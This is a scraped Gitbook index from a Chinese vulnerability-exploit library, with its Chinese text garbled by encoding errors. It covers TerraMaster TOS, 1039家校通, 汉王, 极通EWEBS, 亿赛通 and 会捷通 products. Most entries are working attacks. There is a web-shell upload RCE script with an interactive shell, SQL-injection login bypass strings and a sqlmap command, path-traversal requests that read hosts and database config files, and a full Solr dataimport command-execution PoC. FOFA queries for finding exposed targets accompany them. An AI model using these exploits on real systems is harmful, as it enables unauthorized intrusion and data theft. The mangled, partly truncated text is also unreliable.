Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/TerraMaster/TerraMaster TOS RCE CVE-2020-28188.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/TerraMaster/TerraMaster TOS RCE CVE-2020-28188.html","title":"TerraMaster TOS RCE CVE-2020-28188","keywords":"","body":"TerraMaster TOS RCE CVE-2020-28188 ÊºèÊ¥ûÊèèËø∞ TerraMaster TOS 4.2.06 ‰ª•‰∏ã‰∏≠ makecvs.php Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•ÔºåÊîªÂáªËÄÖÂèØ‰ª•‰∏ä‰º†ÊÅ∂ÊÑèÊñá‰ª∂ÊéßÂà∂ÊúçÂä°Âô® ÊºèÊ¥ûÂΩ±Âìç [!NOTE] TerraMaster TOS FOFA [!NOTE] \"TerraMaster\" && header=\"TOS\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã Â≠òÂú®ÊºèÊ¥ûÁöÑ‰∏∫ /include/makecvs.php ‰∏≠ÁöÑEventÂèÇÊï∞ ‰ΩøÁî®EXPÊñá‰ª∂‰∏ä‰º†Âπ∂ÊâßË°åÂëΩ‰ª§ ÊºèÊ¥ûPOC # Exploit Title: TerraMaster TOS 4.2.06 - RCE (Unauthenticated) # Date: 12/12/2020 # Exploit Author: IHTeam # Full Write-up: https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/ # Vendor Homepage: https://www.terra-master.com/ # Version: \\\" >> /usr/www/\"+shell_filename+\" && chmod +x /usr/www/\"+shell_filename+\"||\" payload = urllib.parse.quote(payload, safe='') print(\"[/] Uploading shell...\") response = requests.get(url+'/include/makecvs.php?Event='+payload, headers=headers, verify=False) time.sleep(1) response = requests.get(url+'/'+shell_filename+'?cmd=cat /etc/passwd', headers=headers, verify=False) if ('root:' in str(response.content, 'utf-8')): print(\"[+] Upload succeeded\") else: print(\"\\n[-] Error uploading shell: \", response.content) sys.exit() def interactive_shell(url, headers, shell_filename, cmd): response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(cmd, safe=''), headers=headers, verify=False) print(str(response.text)+\"\\n\") def delete_shell(url, headers, shell_filename): delcmd = \"rm /usr/www/\"+shell_filename response = requests.get(url+'/'+shell_filename+'?cmd='+urllib.parse.quote(delcmd, safe=''), headers=headers, verify=False) print(\"\\n[+] Shell deleted\") upload_shell(url, headers, shell_filename) try: while True: cmd = input(\"# \") interactive_shell(url, headers, shell_filename, cmd) except: delete_shell(url, headers, shell_filename) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/1039ÂÆ∂Ê†°ÈÄö/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/1039ÂÆ∂Ê†°ÈÄö/","title":"1039ÂÆ∂Ê†°ÈÄö","keywords":"","body":"1039ÂÆ∂Ê†°ÈÄö 1039ÂÆ∂Ê†°ÈÄö ‰∏áËÉΩÂØÜÁ†ÅÁªïËøá CNVD-2020-31494 1039ÂÆ∂Ê†°ÈÄö ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/1039ÂÆ∂Ê†°ÈÄö/1039ÂÆ∂Ê†°ÈÄö ‰∏áËÉΩÂØÜÁ†ÅÁªïËøá CNVD-2020-31494.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/1039ÂÆ∂Ê†°ÈÄö/1039ÂÆ∂Ê†°ÈÄö ‰∏áËÉΩÂØÜÁ†ÅÁªïËøá CNVD-2020-31494.html","title":"1039ÂÆ∂Ê†°ÈÄö ‰∏áËÉΩÂØÜÁ†ÅÁªïËøá CNVD-2020-31494","keywords":"","body":"1039ÂÆ∂Ê†°ÈÄö ‰∏áËÉΩÂØÜÁ†ÅÁªïËøá CNVD-2020-31494 ÊºèÊ¥ûÊèèËø∞ Âåó‰∫¨1039ÁßëÊäÄÂèëÂ±ïÊúâÈôêÂÖ¨Âè∏ÊòØ‰∏ÄÂÆ∂‰∏ìÊ≥®È©æÊ†°ÁÆ°ÁêÜÁ≥ªÁªü„ÄÅÈ©æÊ†°ÁßªÂä®ÂäûÂÖ¨Á≥ªÁªü„ÄÅÈ©æÊ†°ÁÆ°ÁêÜËΩØ‰ª∂„ÄÅÈ©æÊ†°ÊãõÁîüÂ∞èÁ®ãÂ∫èÂºÄÂèëÁ≠â,‰∏∫È©æÊ†°Êèê‰æõÊó†Ê≠ªËßíÁöÑÈ©æÊ†°ÁÆ°ÁêÜÁ≥ªÁªüËß£ÂÜ≥ÊñπÊ°à„ÄÇ Âåó‰∫¨1039ÁßëÊäÄÂèëÂ±ïÊúâÈôêÂÖ¨Âè∏È©æÊ†°ÁÆ°ÁêÜÁ≥ªÁªüÂ≠òÂú®‰∏áËÉΩÂØÜÁ†ÅÁªïËøáÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØÂà©Áî®ËØ•ÊºèÊ¥ûËé∑ÂèñÊï∞ÊçÆÂ∫ì‰ø°ÊÅØ„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] 1039ÂÆ∂Ê†°ÈÄö v1.0 - v6.0 FOFA [!NOTE] title=\"Â≠¶ÂëòÁôªÂΩï_1039ÂÆ∂Ê†°ÈÄö\" ÊºèÊ¥ûÂ§çÁé∞ ÁÆ°ÁêÜÂëòÁôªÂΩïÊé•Âè£‰∏∫ /admin/Product/Comstye.aspx /Student/StudentLogin.aspx /Teacher/Index.aspx Ë¥¶Âè∑ÂØÜÁ†Å‰∏∫Â¶Ç‰∏ãÂç≥ÂèØÁôªÂΩï user:peiqi pass:' or ''=' Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/1039ÂÆ∂Ê†°ÈÄö/1039ÂÆ∂Ê†°ÈÄö ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/1039ÂÆ∂Ê†°ÈÄö/1039ÂÆ∂Ê†°ÈÄö ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û.html","title":"1039ÂÆ∂Ê†°ÈÄö ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û","keywords":"","body":"1039ÂÆ∂Ê†°ÈÄö ÂêéÂè∞‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Âåó‰∫¨1039ÁßëÊäÄÂèëÂ±ïÊúâÈôêÂÖ¨Âè∏ÊòØ‰∏ÄÂÆ∂‰∏ìÊ≥®È©æÊ†°ÁÆ°ÁêÜÁ≥ªÁªü„ÄÅÈ©æÊ†°ÁßªÂä®ÂäûÂÖ¨Á≥ªÁªü„ÄÅÈ©æÊ†°ÁÆ°ÁêÜËΩØ‰ª∂„ÄÅÈ©æÊ†°ÊãõÁîüÂ∞èÁ®ãÂ∫èÂºÄÂèëÁ≠â,‰∏∫È©æÊ†°Êèê‰æõÊó†Ê≠ªËßíÁöÑÈ©æÊ†°ÁÆ°ÁêÜÁ≥ªÁªüËß£ÂÜ≥ÊñπÊ°à„ÄÇ Âåó‰∫¨1039ÁßëÊäÄÂèëÂ±ïÊúâÈôêÂÖ¨Âè∏È©æÊ†°ÁÆ°ÁêÜÁ≥ªÁªüÂêéÂè∞ÁºñËæëÂô®Â≠òÂú®‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØ‰ª•ÈÄöËøáÊäìÂåÖÁöÑÊñπÂºèÂæóÁü•webshellË∑ØÂæÑÔºåÂØºËá¥ÊúçÂä°Âô®Ë¢´ÂÖ•‰æµ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] 1039ÂÆ∂Ê†°ÈÄö v1.0 - v6.0 FOFA [!NOTE] title=\"Â≠¶ÂëòÁôªÂΩï_1039ÂÆ∂Ê†°ÈÄö\" ÊºèÊ¥ûÂ§çÁé∞ ‰ΩøÁî® 1039ÂÆ∂Ê†°ÈÄö ‰∏áËÉΩÂØÜÁ†ÅÁªïËøá CNVD-2020-31494 ÁôªÂΩïÂêéÂè∞ÂêéÊâæÂà∞ÁºñËæëÂô®È°µÈù¢ BurpÊäìÂåÖ‰∏ä‰º† asp webshellÊú®È©¨ ÂèØ‰ª•ÂæóÁü•webshellÂú∞ÂùÄÔºåËøôÈáåÊàë‰ΩøÁî®ÁöÑÂÜ∞ËùéÈªòËÆ§È©¨Ôºå‰ΩøÁî®ÂÜ∞ËùéËøûÊé• Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Ê±âÁéãÁßëÊäÄ/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Ê±âÁéãÁßëÊäÄ/","title":"Ê±âÁéãÁßëÊäÄ","keywords":"","body":"Ê±âÁéãÁßëÊäÄ Ê±âÁéã‰∫∫ËÑ∏ËÄÉÂã§ÁÆ°ÁêÜÁ≥ªÁªü Check SQLÊ≥®ÂÖ•ÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/Ê±âÁéãÁßëÊäÄ/Ê±âÁéã‰∫∫ËÑ∏ËÄÉÂã§ÁÆ°ÁêÜÁ≥ªÁªü Check SQLÊ≥®ÂÖ•ÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/Ê±âÁéãÁßëÊäÄ/Ê±âÁéã‰∫∫ËÑ∏ËÄÉÂã§ÁÆ°ÁêÜÁ≥ªÁªü Check SQLÊ≥®ÂÖ•ÊºèÊ¥û.html","title":"Ê±âÁéã‰∫∫ËÑ∏ËÄÉÂã§ÁÆ°ÁêÜÁ≥ªÁªü Check SQLÊ≥®ÂÖ•ÊºèÊ¥û","keywords":"","body":"Ê±âÁéã‰∫∫ËÑ∏ËÄÉÂã§ÁÆ°ÁêÜÁ≥ªÁªü Check SQLÊ≥®ÂÖ•ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Ê±âÁéã‰∫∫ËÑ∏ËÄÉÂã§ÁÆ°ÁêÜÁ≥ªÁªüÂ≠òÂú®SQLÊ≥®ÂÖ•ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØÂà©Áî®ËØ•ÊºèÊ¥ûËé∑ÂèñÊï∞ÊçÆÂ∫ìÊïèÊÑü‰ø°ÊÅØ„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Ê±âÁéã‰∫∫ËÑ∏ËÄÉÂã§ÁÆ°ÁêÜÁ≥ªÁªü FOFA [!NOTE] title=\"\"Ê±âÁéã‰∫∫ËÑ∏ËÄÉÂã§ÁÆ°ÁêÜÁ≥ªÁªü\"\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÁïåÈù¢Â¶Ç‰∏ã ËØ∑Ê±ÇÂåÖÂ¶Ç‰∏ã POST /Login/Check HTTP/1.1 Host: x.x.x.x Content-Length: 27 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://x.x.x.x:8088 Referer: http://x.x.x.x:8088/Login/Index Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: ASP.NET_SessionId=otvxgfy0csmrw4i5y5t24oo1 Connection: close strName=admin&strPwd=123456 ÂÖ∂‰∏≠strNameÂèÇÊï∞Â≠òÂú®Ê≥®ÂÖ• sqlmap -r postwang.txt -p strName --current-user user: admin' or 1=1-- pass: admin ‰∏áËÉΩÂØÜÁ†ÅÁªïËøáÁôªÂΩï Goby & POC Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÊûÅÈÄöEWEBS/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÊûÅÈÄöEWEBS/","title":"ÊûÅÈÄöEWEBS","keywords":"","body":"ÊûÅÈÄöEWEBS ÊûÅÈÄöEWEBS testweb.php ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û ÊûÅÈÄöEWEBS casmain.xgi ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÊûÅÈÄöEWEBS/ÊûÅÈÄöEWEBS casmain.xgi ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÊûÅÈÄöEWEBS/ÊûÅÈÄöEWEBS casmain.xgi ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html","title":"ÊûÅÈÄöEWEBS casmain.xgi ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û","keywords":"","body":"ÊûÅÈÄöEWEBS casmain.xgi ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ÊûÅÈÄöEWEBS casmain.xgi ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•ËØªÂèñ‰ªªÊÑèÊñá‰ª∂ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ÊûÅÈÄöEWEBS FOFA [!NOTE] app=\"Êñ∞ËΩØÁßëÊäÄ-ÊûÅÈÄöEWEBS\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÊºèÊ¥ûËØ∑Ê±ÇÂåÖ‰∏∫ POST /casmain.xgi HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=923b86fa90ce1e14c82d4e36d1adc528; CookieLanguageName=ZH-CN Content-Length: 57 Language_S=../../../../windows/system32/drivers/etc/hosts ÂèØ‰ª•ÈÖçÂêà testweb.php ‰ø°ÊÅØÊ≥ÑÈú≤ËØªÂèñÊïèÊÑü‰ø°ÊÅØ Language_S=../../Data/CONFIG/CasDbCnn.dat Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/ÊûÅÈÄöEWEBS/ÊûÅÈÄöEWEBS testweb.php ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.m.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/ÊûÅÈÄöEWEBS/ÊûÅÈÄöEWEBS testweb.php ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.m.html","title":"ÊûÅÈÄöEWEBS testweb.php ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.m","keywords":"","body":"ÊûÅÈÄöEWEBS testweb.php ÊïèÊÑü‰ø°ÊÅØÊ≥ÑÈú≤ÊºèÊ¥û.m Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:50:07 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∫øËµõÈÄö/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∫øËµõÈÄö/","title":"‰∫øËµõÈÄö","keywords":"","body":"‰∫øËµõÈÄö ‰∫øËµõÈÄö ÁîµÂ≠êÊñáÊ°£ÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªü dataimport ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∫øËµõÈÄö/‰∫øËµõÈÄö ÁîµÂ≠êÊñáÊ°£ÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªü dataimport ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∫øËµõÈÄö/‰∫øËµõÈÄö ÁîµÂ≠êÊñáÊ°£ÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªü dataimport ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û.html","title":"‰∫øËµõÈÄö ÁîµÂ≠êÊñáÊ°£ÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªü dataimport ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û","keywords":"","body":"‰∫øËµõÈÄö ÁîµÂ≠êÊñáÊ°£ÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªü dataimport ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ‰∫øËµõÈÄö ÁîµÂ≠êÊñáÊ°£ÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªü dataimport Â≠òÂú®ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊûÑÈÄ†ÁâπÂÆöÁöÑËØ∑Ê±ÇÂèØÊâßË°å‰ªªÊÑèÂëΩ‰ª§ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ‰∫øËµõÈÄö ÁîµÂ≠êÊñáÊ°£ÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªü FOFA [!NOTE] title=\"ÁîµÂ≠êÊñáÊ°£ÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªü\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÂΩïÈ°µÈù¢Â¶Ç‰∏ã ÂÖàËé∑Âèñ core name ËÆøÈóÆË∑ØÂæÑ /solr/admin/cores ‰ΩøÁî®POCÊâßË°åwhoami ÊºèÊ¥ûPOC import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mTitle : ‰∫øËµõÈÄö ÁîµÂ≠êÊñáÊ°£ÂÆâÂÖ®ÁÆ°ÁêÜÁ≥ªÁªü dataimport ËøúÁ®ãÂëΩ‰ª§ÊâßË°åÊºèÊ¥û \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/solr/admin/cores\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ËØ∑Ê±Ç {}/solr/admin/cores.... \\033[0m\".format(target_url)) if 'responseHeader' in response.text and response.status_code == 200: result = re.search( r'([\\s\\S]*?)', response.text, re.I) core_name = result.group(1) print(\"\\033[36m[o] Ëé∑Âèñcore_name : {} \\033[0m\".format(core_name)) POC_2(target_url, core_name) else: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_2(target_url, core_name): cmd = \"whoami\" vuln_url = target_url + \"/solr/{}/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22{}%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22title%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20stream%3D%22true%22%0A%20%20%20%20%20%20%20%20name%3D%22entity1%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20rootEntity%3D%22true%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22title%22%20xpath%3D%22%2FRDF%2Fitem%2Ftitle%22%20%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20\".format(core_name, cmd) files = { 'stream.body': ''' ''' } try: print(\"\\033[36m[o] Ê≠£Âú®ÊâßË°å whoami ... \\033[0m\".format(target_url)) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, files=files, verify=False, timeout=5) cmd_response = re.search( r'documents\">([\\s\\S]*?)', response.text, re.I) cmd_response = cmd_response.group(1) if response.status_code == 200 and cmd_response: print(\"\\033[36m[o] ÂëΩ‰ª§ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(cmd_response)) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∏≠ÂàõËßÜËøÖ/":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∏≠ÂàõËßÜËøÖ/","title":"‰∏≠ÂàõËßÜËøÖ","keywords":"","body":"‰∏≠ÂàõËßÜËøÖ ‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ list ÁõÆÂΩïÊñá‰ª∂Ê≥ÑÈú≤ÊºèÊ¥û ‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ fileDownload ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ ÁôªÂΩïÁªïËøáÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∏≠ÂàõËßÜËøÖ/‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ list ÁõÆÂΩïÊñá‰ª∂Ê≥ÑÈú≤ÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∏≠ÂàõËßÜËøÖ/‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ list ÁõÆÂΩïÊñá‰ª∂Ê≥ÑÈú≤ÊºèÊ¥û.html","title":"‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ list ÁõÆÂΩïÊñá‰ª∂Ê≥ÑÈú≤ÊºèÊ¥û","keywords":"","body":"‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ list ÁõÆÂΩïÊñá‰ª∂Ê≥ÑÈú≤ÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØÊüê‰∏™Êñá‰ª∂ listÂèÇÊï∞ Â≠òÂú®ÁõÆÂΩïÊñá‰ª∂Ê≥ÑÈú≤ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•Ëé∑Âèñ‰∏Ä‰∫õÊïèÊÑü‰ø°ÊÅØ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ FOFA [!NOTE] body=\"/him/api/rest/v1.0/node/role\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÈôÜÈ°µÈù¢Â¶Ç‰∏ã ËÆøÈóÆUrl /him/api/rest/V1.0/system/log/list?filePath=../ Goby & POC Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∏≠ÂàõËßÜËøÖ/‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ fileDownload ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html":{"url":"book/WebÂ∫îÁî®ÊºèÊ¥û/‰∏≠ÂàõËßÜËøÖ/‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ fileDownload ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html","title":"‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ fileDownload ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û","keywords":"","body":"‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ fileDownload ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ ‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ fileDownload Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºåÊîªÂáªËÄÖÈÄöËøáÊºèÊ¥ûÂèØ‰ª•ËØªÂèñÊúçÂä°Âô®‰∏äÁöÑ‰ªªÊÑèÊñá‰ª∂ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] ‰ºöÊç∑ÈÄö‰∫ëËßÜËÆØ FOFA [!NOTE] body=\"/him/api/rest/v1.0/node/role\" ÊºèÊ¥ûÂ§çÁé∞ ÁôªÈôÜÈ°µÈù¢Â¶Ç‰∏ã ÂèëÈÄÅËØ∑Ê±ÇÂåÖ POST /fileDownload?action=downloadBackupFile HTTP/1.1 Host: Content-Length: 24 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 